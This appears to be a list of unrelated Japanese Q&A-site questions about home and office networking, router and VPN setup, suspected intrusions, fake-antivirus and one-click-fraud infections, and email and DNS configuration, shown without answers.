centos6.0とwindows7間でsambaにて 共有ファイルを作成したいのですが 、作成するにあたってディレクトリ ごとにアクセス権限をつけたいので すがどなたかやり方を教えてはもら えないでしょうか？ 例としては/hom e/に「1」、「2」、「3」、「4」と いうディレクトリがあり「a」グルー プに所属しているユーザはすべてア クセス可、「b」グループに所属して いるユーザは「1」以外アクセス可、 「c」グループに所属しているユーザ は「3」、「4」のみアクセス可、「d 」グループに所属しているユーザは 「4」のみアクセス可という感じの設 定にしたいです。またアクセスを許 可すると同時に読み書きも可能にす る設定もできるようにしたいです。 どなたかよろしくお願いいたします
　セキュリティを潜り抜け、私のPCに不正アクセスが何度か行われ、その影響でしょうか、ルーターが関係しているのか、無言電話の現象が頻繁に起きました。そのため、パソコンを買い替え、新たなＰＣには、前のパソコンのデータを復元して、前のパソコンのままであるような偽装工作をしています。新たな不正アクセスの証拠をとるためでもあります。犯罪者をおとりにかける意味です。前のパソコンをそのまま解析し、不正アクセス犯罪者を特定するためです。前のパソコンに侵入者の痕跡が何らかのデータとして残っているのではないかと考えているのです。 　お聞きしたいのは、どのくらいの経費がかかるのか、またどのような業者さんに依頼したらよろしいでしょうか、ということです。前のＰＣは、インターネットに接続しないで、犯罪の解明のために全く使わないで、そのまま、とっておいてあります。不正アクセスは、どんな理由があろうと、犯罪に間違いないことですので。セキュリティを潜り抜けていること、以前より、私が提起している訴訟があること等の関係で、都合が悪くなった犯罪者たちが必死になっているようです。
海外から自宅のルーターにVPN接続でインターネットをしたいです。 特に自宅のサーバでデータをやり取りする必要もなく、日本のIPでインターネット接続がしたいだけです。 有料のVPN提供会社などありますが、せっかく自宅にずっと起動しているルーターがあるので、こちらを経由して接続できる方法を知りたいです。 （ネットワーク初心者なので、方法が良く分かりません。ちなみにproxyサーバという方法もありますが、VPNについて知りたいです。） 自宅のルーターはBUFFALO WHR2-G54です。 よろしくお願いします。 また、このような接続の場合の危険性については、いかがでしょうか？
メールを送信する時にＢＣＣに登録している複数の人に送信していたのですが誤って宛名にメルアドをいれ送信してしまい複数の人にアドレスが知れることになりました。今後、誤送信をしない方策はありますか。
PCを一晩中つけっぱなしにして、翌朝パソコンを開くと、たいてい必ず銀行のソフトのウィンドウが開いています。このソフトは常駐で、タイマーでウィンドウが開くということはありません。 これってパソコンに侵入されているってことでしょうか？銀行ソフトを開けられるってことは、パソコンのデータも全部コピーされているってことでしょうか？何をされたか、記録をとることは可能でしょうか？侵入したなら、なぜ銀行のソフトのウィンドウくらい、閉じておかないのでしょうか？ ルータ、ウィンドウズ７Ultimate、Zonealarmとマイクロソフトセキュリティエッセンシャルを入れてます。ウィンドウズのLivemeshも入ってます。
Flash Player とゆうのをインストールとでてきますが、 インストールができないし、英語ばかりだし何がなんだかわかりません わかる人教えてください
将来の紙媒体による情報漏洩原因を探るために複合機にスプールされたデータを数ヶ月間保管することは現実に行われていないのでしょうか？約500名程の企画会社ですが紙媒体の情報漏洩対策の一つとして考えています。 保管場所の容量等々の問題があるように思いますが運用されている方がいらっしゃれば、費用等の問題や留意点を教えて頂きたくよろしくお願いいたします。
現在、「マスタリングTCP/IP 応用編」を読んで、TCP/IPについて学習をしています。 本を読んでいく中で、分からないことがあり、ネットで調べてもいまいち要領を得ませんでしたので質問いたします。 疑問に感じたのは上記書籍の2つの文言です。 (1)「データグラムがネットワークを通るとき、データグラムがネットワークのMTUを超えていれは、フラグメント化を行わなければなりません。」（101Pより引用） (2)「マルチフラグメントデータグラムの最初のフラグメントを受信すると、受信側のホストはバッファースペースを割り当て、タイマー（再構成タイマー）を起動させます。このタイマーが終了しないうちに、すべてのフラグメントが受信されなければなりません。受信終了前にタイマーが終了すると、それまでに受信したフラグメントはすべて破棄され、ICMPメッセージが送信元ホストに送られます。」（102Pより引用） ●質問１ IEにて（LinuxOSのような）大きいサイズのデータをダウンロードしている際に、データ伝送に遅延が発生し、(2)におけるタイマーが終了してしまった場合に、「Internet Explorerではxxxxxxxをダウンロードできません。処理がタイムアウトになりました」といったメッセージが出るという考えで合っていますでしょうか？ ●質問２ IEなどではデータのダウンロードが95%まで行っていてもタイムアウトエラーなどでダウンロードが中断すれば、また始めからダウンロードを開始しなければなりません。（この考えは(1)と合っている気がします。） しかし、リジュームに対応しているダウンローダーなどを用いれば、中断しても95%からダウンロードを再開できますが、ダウンローダのリジューム機能というのはどのように実装されているのでしょうか？ もう少し具体的に書きますと、自分のPCからOSを格納しているサーバまでのルートが常に一定（たとえばA→B→Z）であれば、(1)で判明したMTUに従って分割された残りの5%に相当するフラグメントファイルのみダウンロードすれば残りファイル全てが手に入るのかもしれませんが、そもそもそんな要求ができるのでしょうか？ もし出来るとしても、それは中断前と再開時のルートが同じであるという前提であると考えています。たとえば、1日前にダウンロードを中断し、翌日にダウンロードを再開した際に、ルートが変わっていた場合（例えばA→C→Z）、MTUも変わる事があると思いますが、、、そんな時にはどうやってリジュームを実現するのでしょうか？ 長くなりましたが、わかる方、教えていただけると幸いです。
ネットワーク機器（ルーター、Ｌ３SW）に関するご質問 ネットワーク機器（インターネット回線との接続機器）として使用します ルーターとＬ３スイッチに関する質問を3点お願いしたいと思います。 1.ルーターとＬ３スイッチはどちらのほうがインターネット接続機器として よいでしょうか。 2.インターネット接続ができるための条件というのはございますでしょうか （回線業者の終端装置とルーター、Ｌ３スイッチをつなぐと思いますが、 その口は通常のイーサネット口があれば、基本的にはつながるという認識でよろしいでしょうか） 3.インターネット接続装置として、どのような機能がついているものがよいという認識でしょうか （○○というプロトコルがつかえる、○○の数値が高いほうが性能がよいという基準はございますでしょうか） 詳しい方いらっしゃりましたら アドバイス参考いただきたいと思います。 宜しくお願い致します。
添付の画像のような画面が何度か表示されました。 ウィルスかと思い、慌てて、初心者なりに以下の対処を行いましたが、 助けてください。 ■質問 1.何のウィルスでしょうか 2.ウィルスバスターは最新日付にアップデートできないものでしょうか 3.ここまで顕著でもウィルス対策ソフトで除去できないのでしょうか 4.別ドライブのリカバリでパーティションからやり直せば完全に除去できるでしょうか ■発生 1.ブラウザGoogle Chromeを開き、Gyaoの画面を開く 2.2,3クリックしたところで、添付画像のような棒状の 　ちらつきが画面じゅうに発生する。 ■問題画面 添付画像は、以下の方の画像をお借りしたもので実物はもう少し異なります。 実物は： ((添付と違う点)) 1.一つ一つの長方形の「縦」はもう少し短い。 2.長方形の大きさはすべて統一されたもの。 3.１つ１つの長方形の「色」は添付のように黒色ではなく、 　　昔のテレビのちらつきのように少しピンクや水色が混ざる感じ。 ((添付と同じ点)) 4.但し、全体的にちらついた長方形が画面じゅうに表示される現象は 　添付と同じような感じです。 お借りした画像 http://bbs.kakaku.com/bbs/K0000367893/SortID=148 … ■PC ・OS:windows 7 ・ディスプレイとの出力：DVI ■対処 1.LANケーブルをはずす 　ディスプレイに問題がないか確認：他のPCの出力(VGA)は正常 　に表示される。 2.フリーズ状態で、 　　2.1.以下も実行出来ず： 　　　・タスクマネージャの起動 　　　・Ctrl^Alt^Dltによる再起動 　　2.2.電源長押しによる強制終了をする。 3.セーフモードで起動 　 3.1.セーフモード選択後に以下を大量に読み込むのが気になりました。 　　　　普通ありましたっけ？ C:\WINDOWS\System32\DRIVERS・・・ C:\WINDOWS\System32\drivers・・・ ) 　 3.2.セーフモード中はウィルスバスター起動できず。) 4.通常モードで起動 　ウィルスバスターで検索。 　　途中でOSごとフリーズしたため強制終了 5.セーフモードで起動 　　5.1.外付けHDDを接続(前回BackUp時との差分データを保存するため) 　　　し、一度接続できたが、PC本体をさわっているタイミングで 　　　強制終了され、 　 　　5.2.以後、セーフモードでは外付けHDDを接続できず。 　　5.3.スタートアップ時の気になるもの以下をいくつか無効に設定 　　　　(ついでにいらないものも無効に) 　　　　スタートアップを無効にしたもの： 　　　　-AtwtusbIcon 製造元 不明 　　　　-tsnp2std 製造元 不明 　　　　-Backup Utility 製造元 BUFFALO INC 　　　　-iTUNES 製造元 AppleINc 　　　　-Windows Live Messenger 製造元Microsoft Corporation 　　　　-tapur manager program 製造元tapur.com 　　　　-Trend Micro Titanium 製造元 Trend Micro Inc. 6.差分のバックアップ実行 　(新しいHDD用意しました(TT)。感染ファイルがある可能性もあるため、 　また、途中で何が起こるかわからないため、以前のHDDとはわけました。) 7.ウィルス検索 　7.1.定義のアップデート 　　　前日日付で再診と認識され、本日日付のものはダウンロードできず。 　7.2.ウィルス検索 　　　全検索したが、検出されず。 発生～現在 　上記対処の中で、通常起動時では問題現象(ちらつき)を何度か見たが、 　現在7.を終えた時点では発生せず。再度gyaoのページを表示したも 　発生しなかった。 過去 　数週間前?、パソコン起動時に何もしていないにも関わらず、空のフォルダが 　開かれる現象などがあり、・・・対処が遅れていた。 前日 　gyaoのサイトを閲覧中、何度も映像の途中で動画が進まなくなり始めの 　位置に戻る現象が発生していた。(サーバー側が重いと思っていた) 反省 　フリーメールアドレス宛に以上に迷惑メールが来るが、開きもせずに 　そのままにしていた。。変更するべきでしょうか。 　他、各アプリケーションソフトのアップデートに不信で遅れていた。
ありがとうございます！ 添付のOSI参照モデル図につき、質問が2点あります。 (1)なぜGatewayのところで、アプリケーション層までデータが行っているのでしょうか？ (2)ハブやルータ、Gatewayを通る際には、必ず非カプセル化（と再カプセル化？）がその都度行われるのでしょうか？ どうぞ、アドバイスよろしくお願いいたします。
MSN日本語ホームページから産経ニュース記事を閲覧後、ホームに戻したら中国語になっていた。ウィする感染でしょうか？
ある会社に、クレームの意味での投稿を、匿名でしたいと思っています。 こういった場合、メールの送信元は判明しますか。 相手先はIT系なので、普通よりは判明できる範囲が広い気もするのですが、 どういったところまで分かるのでしょうか。 また、メールの送受信のソフトに、「Content-Type」という欄があります。 これが手がかりになったりしますか。 よろしくお願いします。
ネットワークについて勉強をしている初心者ですが、今私が読んでいる本のネットワーク例として、 （インターネット）ー（ＩＳＰ）ー（ルータ）ー（Ｌ２スイッチ）ー（ＰＣ） という図があるのですが、なぜＬ２スイッチが必要なのでしょうか？また、Ｌ２スイッチがないとどうなるのでしょうか？本で読んでもいまいち理解ができません。 初心者ですので、できる限り詳しく教えて頂ければ助かります。 お願いいたします。
社内のみで使用できるwebアプリケーションを作成しています。 現在xamppをインストールしてサーバーを作り、webアプリケーションはphpで作成しています。 OSはwindowsXP、ブラウザはInternetExplorer8です 「webブラウザから特定のＰＣ（（Ａ）とする）のローカルアプリケーション（を動作させるvbsを実行）する」がやりたいことです。 現状では http://localhost/○○/△△.phpにアクセスし、あるボタンを押すと jabascript　cmd() が実行され、さらにvbsが実行されます。 そのvbsで、ＰＣ（Ａ）のローカルアプリケーションが実行されます。 しかし、http://192.ｘｘｘ.xx.xx/○○/△△.phpからjavascriptを実行しようとしても 「オートメーションサーバーはオブジェクトを作成できません。」というエラーになってしまいます。 他のＰＣからはhttp://localhost/○○/△△.phpにはアクセスできません。 社内のどのＰＣからアクセスしてもＰＣ（Ａ）のローカルアプリケーションが実行されるようにしたいのです。 いろいろと検索してみたのですが何分初心者なので、権限？セキュリティのことなどわからないことが多く、具体的な解決方法が見つかりません。 ブラウザからアプリケーションを実行するということが簡単にできないことはわかっているのですが、 全く方法はないのでしょうか？ 何か良い方法があれば教えていただきたいです。 よろしくお願いいたします。 ちなみに以下はjavascriptの内容になります。 function cmd(){ var obj = new ActiveXObject("WScript.Shell"); obj.Run("C:/xampp/htdocs/○○/□□□.vbs"); }
お世話になっています。 開けた心当たりがなく、fuserで調べてもひっかからないポートがあります。 これらはどうやって閉じたらいいでしょうか？ iptables は、22・80など以外は遮断しています。 # nmap xxx.xxx.xxx.xxx（←自分のグローバルIP） # 5432/tcp open postgresql　・・・（１） # 49152/tcp open unknown　・・・（２） # # fuser -vn tcp 5432 # リターンなし、入力待ち状態になる # fuser -vn tcp 49152 # リターンなし、入力待ち状態になる （１） postgresqlが入っていないのに、ポートが開いている。 再起動しても開いている。 ・service --status-all | grep postgre*　→　ヒットなし ・chkconfig --list | grep postgre*　→　ヒットなし （２） 心当たりがないポートが開いている。 再起動しても開いている。
会社でWAPM-APG300Nを複数台でブリッジさせて使っています。 今まで無線チャンネルは、Auto(W52+W53)で使っていましたが、 最近になってAuto(W52+W53+W56)も選べることがわかりました。 そこで質問ですが、W56を使うメリットはいくつか見つかりましたが、 じゃあ逆に使わないことによるメリットはあるのでしょうか？ 実はこのルータ、外注の業者の人に設定してもらったものなので、 何か意味があってわざとW56を使わないようにしていたのだと思うのですが、 ただ調べた限りではメリットしか見つけられませんでした。 ご回答よろしくお願いいたします。
アダルトサイトヘラクレス入会の手続き完了の画面を消せない。 ネット検索中に、クリックしてしまいましたが（７月２５日）、電話で入会手続きした覚えはないといっても埒が明きません。なお「サービス期間中の料金の確定はできていない」ど表示されています。
いつもご指南頂いてます。 とある中堅飲食チェーンで商品開発をしております。　商品開発部なのに、何故かデータベースの整理やHPの更新などさせられてます。情報システム部でも作ってくれればいいのに、、、というのは愚痴ですスミマセン。 さて、今日も休日出勤で広島県産のレモンを使ったスイーツを試行錯誤していたところ、突然上司から以下の機器を渡され、「インターネットが繋がる様に設定するように」と申し付けられました。 （元々は業者に設定してもらうという話だったのデス。。） (1)富士通製ルータ　Si-R　G200 http://fenics.fujitsu.com/products/sir/sirg200/ (2)DoCoMo通信カード　F-06C http://www.nttdocomo.co.jp/product/data/f06c/ind … わたくし、家庭のネット設定や簡単なLAN設定位ならやりますが、この様な専門的なルータは触ったことがありません。。 一先ず色々検索してみたところ、以下のURLがあったので http://fenics.fujitsu.com/products/technical/exa … なるほど、このコンフィグを元にすれば良いのかな、というところに辿り着きましたが、いつも触ってるルータみたいに、WEB画面で設定する機能が無いじゃありませんか。。 そしてまたゴリゴリ調べてみたらテラタームとかいうソフトが使える様だったので使ってみたら、何とかコンフィグを書き換えることができました。 しかし、やはりネットに繋がりません。DHCPの機能として、IPは割り振られます。 このルータか、類似のルータでインターネットの設定をされた方、何かヒントを頂けないでしょうか？ 参考になるHPなどでも結構です。 なにとぞ、よろしくお願いいたします。
警察はIPアドレスで住所特定出来ますか？ 携帯電話も住所特定出来ますか？
パソコンを使用しいて。少し席を外すとパソコンのパスワード要求画面が出ます、今までは時間がたっても、パスワードを要求されなかったのですか、設定が変わったのか判りません、ハスワードを毎回入力しないでも良いようにする、設定方法を教えて下さい。 os Win Vista メーカー NEC VL300
つい２，３日前からIE８がおかしいです。　具体的には、ヤフオクを見てたりすると商品ページだけブラウザの戻るボタンで戻れません。その時にボタンの履歴を見ると、「http://www.facebook.com/plugins/like.ph」が本来戻る筈のページの間に絶対かんでいます。　 こちらの教えて！gooでも上のURLプラス「http://www.facebook.com/plugins/likebox」と出てボタン効きにくくなります（必ず、２，３回ボタンを押さないと戻れません）。　 私の個体だけの不具合なのでしょうか？　それとも管理者側の正常な行いによる物でしょうか？ 回避方法も有るようでした、どなたかご教授願います。
iPhone4がハッキングされてしまいました。 下記のような状態になっていました。 Discovered open port 110/tcp on 192.168.3.2 Discovered open port 587/tcp on 192.168.3.2 Discovered open port 993/tcp on 192.168.3.2 Discovered open port 143/tcp on 192.168.3.2 Discovered open port 80/tcp on 192.168.3.2 Discovered open port 8080/tcp on 192.168.3.2 Discovered open port 8888/tcp on 192.168.3.2 Discovered open port 25/tcp on 192.168.3.2 Discovered open port 995/tcp on 192.168.3.2 Discovered open port 62078/tcp on 192.168.3.2 Discovered open port 119/tcp on 192.168.3.2 Discovered open port 8008/tcp on 192.168.3.2 Discovered open port 81/tcp on 192.168.3.2 Discovered open port 82/tcp on 192.168.3.2 Discovered open port 563/tcp on 192.168.3.2 Discovered open port 3128/tcp on 192.168.3.2 Discovered open port 465/tcp on 192.168.3.2 Discovered open port 8081/tcp on 192.168.3.2 jailbreakもしていませんし、iOSも最新版にしてあります。 試しに工場出荷状態に戻してみましたが変わりません。 iPhoneはカメラや録音やGPSがついてるので、そのまま にしておくわけにはいきませんので、具体的な対策を教えてください。
カテゴリ違いでしたらすみません。 友人A君の話です。 アンケートに答えてポイントを貯め現金化するサイト、 及び、様々な懸賞において、2重応募をしている人A君がいます。 A君の彼女＝実在する人物・実在する住所　で登録をし、 A君がアドレスを別に持ち、 A君がA君のPCでアンケートに答えたり懸賞に応募したりしています。 アンケートの謝礼や懸賞は、彼女が受け取っています。 A君は別途、自分のアドレス・住所でアンケートや懸賞を受け取っています。 アドレスを変え、同じサイトで2重に応募したりアンケートに答えたりしているということです。 ただし、PCは一つです。 アンケートサイト、及び懸賞元の企業には、2重ということはわからないのでしょうか？ IPアドレスとか（私はよくわからないのですが）で判明したりしないのでしょうか？ 「架空の人物ではないし、代理でやってるだけ」と彼は悪びれもせず行っていますが どうかと思うので質問しました。
これってハッキングですか？ ？がついていて不明なアカウントとあるんですけど・・・。 こんなのがあったらどう対処すれば良いのでしょうか？ http://www.atmarkit.co.jp/fwin2k/win2ktips/307si … 削除方法、管理者権限で削除する方法を教えてください。 ウイルスやハッキングってどうやって築くんですか？
Androidで外出先からパソコンを起動させたいです。 現在のネットワークはこうなっています。スマホ以外有線LANです。 ONU－－HGW（ルーター）（BL190HW）－－ルーターWR8370N（アクセスポイントモード）－－－PC 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　↓ 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　無線LANスマートフォン このため、おそらくアクセスポイントはハブの扱いになっていると思います。 Androidに専用のアプリをインストールして、Wifiネットワークの中ではパソコンの 起動に成功しています。 しかし、３G回線から起動しようとすると、数分間は起動できるのですが、しばらく経ってしまうと 起動しなくなってしまいます。 いろいろ調べてみますと、グローバルIPアドレスが随時変化するため、3G回線からは 一時的にしか利用できないと書いてありましたが、不思議なことに私の家のauひかりは グローバルIPアドレスがここ１年変わっていません。 それなのにWOLができない原因として考えられるものは何でしょうか？ ※ちなみに設置上の都合でHGWとPCを直結することはできません。
HTML5で、<keygen >というタグによって公開鍵ペアの証明書が発行される機能で、あるサイトの認証をしたいのですが、できますでしょうか。 試しましたらフォームで送信処理すると、公開鍵はPOSTで送信され、秘密鍵はブラウザのなかに保存されました。 ということは、このブラウザで、あるサイトをアクセスしたとき、POSTで送った公開鍵を登録したサイトが閲覧でき、登録していない場合はアクセスできないという仕組みを作ることはできるんでしょうか。 できるのでしたらその方法を知りたいので、参考になる本とかウエブサイトがあれば教えてほしいです。
国別のＷｅｂアクセス制限方法について https://www.appletz.jp/support/geoip.php 上記ページに書かれているのと同じ事をIISでやりたいです。 IISでやるにはどんな方法がありますか？
ブラウザはchromeでigoogleからニュー速にアクセスしてバナー広告クリックしたら"ttp://9lick.net/click.・・・”のサイトにアクセスしたのですが、真っ白で何も表示されませんでした。 何もなかったので閉じたところ、今度はIEが自動起動しようとするもののエラーメッセージが出る状態になりました。 とりあえずIEを閉じたところ、またすぐIEが起動し、エラーダイアログを閉じても閉じても延々とIEが自動起動してしまいます。 再起動したところ症状は収まりましたが、ウイルスか何か動作したのではないかと不安でしかたありません。 セキュリティソフトでもサイトの警告でなかったので、もしかするとそのサイトとは無関係だったのかも知れませんが、こうしたウイルス（？）がどんな類いなのかまた”9lick.net”が何のサイトか分からずさらにこのアドレスをキーワードにして検索すると”競馬投資・・・”みたいなのが出てくるので怪しさ満点ですのでこのサイトについて何か情報お持ちでしたら教えていただけませんか？
パソコンに詳しい人に聞きます。サイトでエロサイトとか見せたくないサイトとかを 見れないようにしたり、年齢制限とか、パスワードとか かけてりできるのでしょうか？ 実は次男がいまして、アニメとかを見るときトレントと言う奴を 使おうとしているんです。勿論、違法なので遣らせない様にしているんですけど、 口で言っても分からない奴なのでそのサイト自体を観れなくしたいんですけど できますかね？幸いにも次男は、パソコンに関して疎いので助かってますけど、 いつまで持つか分かりません。どうか教えてくださいｍ（＿ ＿）ｍ あと、エロサイトとかも見たくないんです。作業しているときについつい 観てしまうので見れないようにしたいんです・・・。
変な質問かと思われることを覚悟で、ご回答いただける方、よろしくお願いいたします。 私は、うっかり、あるSNSでヤフーのメアドを公開していました。 しばらくして気がついて、非公開にしました。 そのSNSでは、私の個人情報は繋がりのある人しかみることができません。 SNSの友人の一人が、何となく、私のヤフーメール、知恵袋の情報を知っているのでは、と言うような印象を受けています。 例えば、ネットで買い物をして、そのやりとりをヤフメでしている場合、買ったものについて話題がでる。 知恵袋で「この商品を扱っている店を教えて」と質問したら、その友人からSNSで紹介される。 などが何度かありました。 気が合うな～と思っていたのですが、偶然にしては多い気がして、試しに知恵袋で架空の質問をしてみました。 「今度、仕事先の人の結婚式に招待されたが、ご祝儀はいくらくらいがいいか？」と質問しました。 案の定？、その友人はSNSで冠婚葬祭のホームページのリンクをはってきました。 ちなみに、上記にかいた内容は誰にも話していません。何を買ったか(変なものじゃないです)とか、そんな細かい話を話題にしません。 知恵袋に至っても、周りに趣味嗜好が知られたくないことや、人に言い辛い悩みを聞いています。 ヤフメはログインシールにしました。 その前にPWが他人に分かる訳はないと思うのですが、PWは私と私の親しい人に関する数字の組み合わせなので、甘いかもしれません。 知恵袋はIDでは登録していません。 最近、パソコンにセキュリティーソフトを入れましたが、それまでは期限切れのまま放置して使ってました。 その友人はIT関連に明るく、ITの会社を経営している技術者の友人も持っています。 携帯メール、このサイトの内容については全く、「偶然」と感じることはありません。ヤフーだけです。 その友人は現実にも知っている人で、隣の市に住んでいます。 だいたい、他人のネットの情報を見るなんてできるのでしょうか？ ただの考えすぎでしょうか？ 偶然が重なっただけで、気が合うのでしょうかね？ 変な質問ですみません。 誰にも聞けないので、困っております。
すいません、ネットワーク系の資格試験の過去問なのですが、 なぜこの答えになるのかが分からなくて困っています。 ちなみに恥ずかしながら、私は教える立場の人間です。 この後、説明をしなければいけませんので、 それに役立つ例え等いただけたら幸いです。 以下問題 普段利用しているISPがOP25Bを導入したことにより、外部のメールサーバを利用したメールの送信が出来なくなった。そのためメールクライアントの設定を変更し、再度利用出来るようにした。 このとき、ユーザーが変更したと考えられる箇所を字中の選択肢から１つ選びなさい。なお、外部のメールサーバの利用条件は以下の通りである。 <外部メールサーバーの利用条件> ・メールサーバーの認証：SMTPAuthが必須 ・サブミッションポート：受け入れ可能 ちなみに答えは「b」です。
似たような質問がありましたが、欲しい情報ではなかったので質問させていただきます。 SSL証明書を取得するためCSRファイルを作成することになりました。 実際にはAのウェブサーバで利用するのですが、 BのウェブサーバでAの情報を元にCSRファイルを作成することは可能でしょうか。 CSRファイル作成する際は利用するサーバで作成しなくてはいけないなど あるのでしょうか。 宜しくお願いいたします。
図のように、グローバルネットに接続したクライアントを持つエンドユーザが、 Web ブラウザにドメイン A を指定した時 (例 : domeinA.co.jp) のみ、 グローバルネット上の SaaS サービスを経由してサーバ A にアクセスさせるには、 DNS サーバにどのような設定を行えば良いのでしょうか？ A レコードの他に CNAME レコードの設定が必要そうだと考えていますが、 CNAME レコードをどのように設定すれば良いかがわかりません。 以上、よろしくお願いします
すみません。 ただ今、ものすごく困っているので、どなたかＰＣに詳しい方、教えてください。 セキュリティーで何かしてしまったのか、 何を設定してしまったのかわからないんですが、 以下のように動かなくなります。 インターネットにはつながります。 しかし、例えば、都道府県を選択する覧があるとすると、 入力の覧の右に▼のマークがよくあります。 この▼のマークから選択をしようとしても選択できず、 このボタンを押しただけで、画面が固まってしまいます。 ▼を押すと、選択したい覧は表示されてきますが、 カーソルが動かなくなったりしてしまいます。 そうなると、←の戻るボタンもタスクバーは、前のリンク先を表示しますが、画面は変わりません。 また、ホームを押しても変わりません。 パソコン機種は、Ｄｅｌｌ　 Windowsは、７ です。 何が何だかわからないため、情報が少なくて本当に申し訳ありませんが、 上記のような状態で、少しでも考えられる原因がありましたら、 どうか教えてください。 よろしくお願いいたします。
シスコ５５０５を使用してDMZを設定したいのですが、うまくいきません。 インターネットはNTTのフレッツネクストのIP１６です。 当初ONUからASA5505をつないでいたのですが、PPPOEの設定にunnumberedの設定ができないらしく、そこでNTTよりルーター（Web Caster V130)をレンタルしてONU→ルーター→ASA5505と接続したのですが、DMZの設定がわかりません。ルーター側とASA5505側の最適な設定があれば教えてください。 現在はルーターにPPPOEの設定をして、ASA5505側は192.168.100.2/24をoutsideのインターフェースにしてしまっていてなんとかインターネットが繋げれるのですが、ASA5505側のoutsideのインターフェースは通常グローバルIPが妥当なのではと思うのですが、ルーターにすでにグローバルIPを設定されていてどうなのかと思いました。すいません素人で。なにかこの環境で設定している、文献やリンクなどがありましたら教えてください。よろしくおねがいします。
こんにちは。 私は現在ネットワーク構築について勉強しています。 以下のようにパソコンとルーターを繋ぎ、それぞれにIPアドレスを設定して2台のPCを繋げたいと思っていますが、PC1からルーター2のLANポートにpingは飛ぶのですが、PC2に飛ばすことができません。また、PC2からはルーター2にpingが飛ぶのみでルーター1には飛ばせませんでした。インターネットには接続していません。 [PC1]-----[ルーター1]-----[ルーター2]-----[PC2] IPアドレスは次のようにしました。 PC1：192.168.1.109 ルーター1（LANポート）：192.168.1.1 ルーター2（WANポート）：192.168.1.254 ルーター2（LANポート）：192.168.2.1 PC2：192.168.2.2 ポートの接続ですが、PC1とルーター1の接続はルーター1のLAN2ポート、ルーター1とルーター2の接続にはルーター1のLAN1ポートとルーター2のWANポート、ルーター2とPC2の接続にはルーター2のLAN1ポートを使用しています。 ルーター1,2にはそれぞれLANポートが4つずつありますが、4つのLANポートそれぞれに別のIPアドレスを割り当てることはできず、同じIPアドレスを割り当てることしかできません。 ルーターはルーター1がヤマハのRT57i、ルーター2がヤマハのRT58iを使用しています。 また、ゲートウェイも次のように設定しましたが状況は変わりませんでした。 PC1：192.168.1.1 ルーター1（LANポート）：192.168.1.109 192.168.1.254 ルーター2（WANポート）：192.168.1.1 ルーター2（LANポート）：192.168.2.2 PC2：192.168.2.1 この場合はどこがダメでPC2台が繋がらないのでしょうか。 あるいはルーターとPCの接続にはそれぞれLANポートを使い、ルーター同士の接続ではWANポート同士を繋いでを以下のようにIPアドレスを設定した場合はどうでしょうか。 PC1：192.168.1.109 ルーター1（LANポート）：192.168.1.1 ルーター1（WANポート）：192.168.10.1 ルーター2（WANポート）：192.168.10.2 ルーター2（LANポート）：192.168.2.1 PC2：192.168.2.2 ご回答を宜しくお願いいたします。
最近引っ越し、無線LANの設定をしようとしたのですが、一向にインター年とにつながりません。 前に住んでいた所ではつながったのですが、どのような設定が必要か教えていただければと 思います。 現在の設定は下記のとおりです。 壁ーVH1004ES－WR8700N 今の設定では、「インターネットアクセスなし」と表示されます。 申し訳ございませんがご教授お願いします。
ヤフーメールを使っています。 お知らせが来て、メールの内容、表題を解析すると言っています。 しゃくなので、 ヤフーメールを使っても、内容を解析されないようにしたいのですが、 具体的にはどうしたらよいのでしょうか？ よろしくご指導下さい。 以下、お知らせ。 Yahoo! JAPANのサービスで表示される一部のインタレストマッチ広告において、 お客様がYahoo!メールでご利用になったメールのタイトルおよび本文を機械的 に解析し、その結果を利用することによって、お客様の関心と関連性の高い広 告が表示されやすくなります。 メールのタイトルおよび本文は機械的に解析をしており、解析結果から特定の 個人や本文内容を識別できない仕組みになっております。
今日、夜７時ころ、メールを呼んでいたら、突然背景が黒くなり 「Write Fault Error」という感じのメッセージボックスが２５コ大量に出てきました。 さらに「Sｙｓtem Error.Hard・・・・・・」のボックスも出てきました。 デスクトップにあったアイコン２０コが３コになり、たまに勝手に再起動したり、 Webの動きが遅くて数分かかる時もあります。大量に保存した写真の画像も見当たりません。 ４時間かけて色々検索しましたが、ウイルスに感染したのででしょうか？　 ウイルスバスター２０１２クラウドを入れているのにウイルスに感染しますか？ （もし感染なら、ウイルスバスターの会社に責任はないのですか？） 脅威は検出されません。と表示されますが・・・ もしウイルスなら対処方法を教えて下さい。　　os：　Windows７です。
お疲れ様です。早速ですが最近米軍が出す台風予報進路のサイト（www.­usno.­navy.­mil/­JTWC/ ）がネットで繋がらなくなりました。どうしてでしょうか？解る方がおられましたらご教授ください。また、他のサイトで米軍の台風進路予想がありましたら教えて下さい。宜しくお願い致します。
ウィルス対策ソフトの更新を怠っていたために昨日 パソコン診断ソフト型ウィルスに感染してしまいました。 File Recovery（ファイルリカバリ）というもので、７月中旬から出現したようです 下記サイトでシステム復活・ウィルス除去を試みましたが、 http://www.geocities.co.jp/Playtown-Yoyo/6130/no … 新しいウィルスのために下記サイトにアクティベーションコードが搭載されておらず http://siri-urz.blogspot.jp/search/label/FakeHDD 解除ができません。 インターネット接続状態も悪くなりファイルの所在もわかりません。 不便でなりません どうしたらよいのでしょうか。 アドバイスを至急お願いします
PCから携帯にメールを送ったところ、受信されませんでした。 なりすまし規制（From詐称）に引っかかったのかと考えています。 メールアドレスの正規化（From詐称にならない）ためにはどのような設定を行えばよろしいでしょうか。
一からの入門用としてCiscoルーターを購入するのであれば、どの機種がうってつけでしょうか？ 基本、企業内で問題なく設定が出来るレベルを目指してもらいます。 あまりに、機器本体が安すぎて設定画面上、本番での環境と違いがありすぎるのは避けたいので、 もちろん、価格は安い方が助かりますが…。
ウイルスバスタ-とマカフィ-セキュリティとRegcean Proです。全部必要ですか？教えてください。 宜しくお願いします。
ワンクリック詐欺にかかってしまい、 pcのデスクトップに料金請求の広告が常に表示されてしまします。 msconfigを使用して[スタートアップ]のmshtaで始まるコマンドのものを無効にしましたがそれでも表示されてしまいます。 また［スタートアップ]のすべてを無効にしても表示されてしまい、システムの復元もうまくいかない状況です。 どうしたら表示されなくなるでしょうか。 　ちなみに「抜きスト」とゆうサイトのリンクからかかってしまい添付画像のような広告です。
